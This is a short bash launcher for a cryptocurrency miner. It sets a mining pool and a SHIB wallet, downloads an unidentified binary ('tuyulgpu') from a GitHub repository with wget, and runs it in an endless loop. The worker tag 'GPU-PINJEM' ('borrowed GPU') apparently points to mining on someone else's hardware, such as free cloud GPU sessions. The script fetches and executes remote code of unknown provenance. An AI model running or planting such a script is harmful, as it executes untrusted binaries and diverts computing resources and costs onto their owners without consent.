#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0xc0ebef7b055c334c177ac7a34ce7e40e5e8cddad
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
